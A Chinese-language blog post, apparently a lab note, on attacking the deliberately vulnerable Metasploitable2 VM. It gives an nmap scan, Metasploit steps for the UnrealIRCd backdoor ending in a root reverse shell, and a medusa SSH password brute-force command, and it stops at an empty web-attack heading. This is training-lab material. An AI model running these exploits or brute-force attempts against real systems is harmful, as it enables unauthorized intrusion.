---
title: 渗透之metasploitable使用
date: 2020-03-14 09:26:28
tags:
	- 渗透

---

1

从source forge下载metasploitable2的，还是官方渠道下载比较保险。

是VMware镜像。直接使用VMware打开就好了。

默认只有nat和host-only这2个网卡。

我的攻击机在其他网络里，所以添加一个桥接网卡。

需要自己手动ifconfig配置才行。

系统的时区是0时区的。所以跟我的当前时间差了12个小时。

我给配置的ip地址为172.16.2.50 。

直接浏览器打开这个地址，可以看到一个网页，显示了安装的web应用。

系统的username/password为：msfadmin/msfadmin。

现在在我的Ubuntu攻击机上，用nmap扫描一下这个靶机的端口情况。

```
sudo nmap -T 4  172.16.2.50
```

```
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
```



现在看看怎么根据扫描出来的端口来实施攻击。

在6667端口，运行的是unreal IRCD，这个是一个irc的守护进程。

这个版本的ircd，有个问题。

我们用下面的步骤进行攻击。

```
进入msfconsole
1、use exploit/unix/irc/unreal_ircd_3281_backdoor 
2、set rhosts 172.16.2.50
3、exploit
```

打印如下：

```

[*] Started reverse TCP double handler on 172.16.2.168:4444 
[*] 172.16.2.50:6667 - Connected to 172.16.2.50:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
[*] 172.16.2.50:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo eo8ZDrfKOhPpknpW;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "eo8ZDrfKOhPpknpW\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (172.16.2.168:4444 -> 172.16.2.50:46480) at 2020-03-14 10:07:19 +0800
```

现在就已经是在靶机的命令行环境里了。

输入id，可以看到已经是root用户了。

```
id
uid=0(root) gid=0(root)
```

默认是在/etc/unreal目录下。

```
pwd
/etc/unreal
```

然后你可以在靶机里操作了。

上面说的是metasploit的攻击。

我们试一下其他工具的攻击。

看看medusa来探测靶机的弱口令的。

需要一个用户名字典和一个密码字典。

用这个里面的：https://github.com/Stardustsky/SaiDict

```
medusa -h 172.16.2.50 -U ./user.txt -P ./pass.txt -M ssh
```

但是报错了。

```
 Couldn't load "ssh" [/usr/lib/medusa/modules/ssh.mod: 
```

没有ssh模块的？

看了一下对应的目录下，有这些模块：

```
cvs.mod
http.mod
mssql.mod
nntp.mod
pop3.mod
rexec.mod
rsh.mod
smtp.mod
snmp.mod
telnet.mod
vnc.mod
wrapper.mod
ftp.mod
imap.mod
mysql.mod
pcanywhere.mod
postgres.mod
rlogin.mod
smbnt.mod
smtp-vrfy.mod
svn.mod
vmauthd.mod
web-form.mod
```

都是二进制的文件。

把这些模块挨个试一下。挺慢的。



web应用攻击





参考资料

1、Metasploitable 2 漏洞演练系统使用指南

https://blog.csdn.net/JackLiu16/article/details/79425390?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task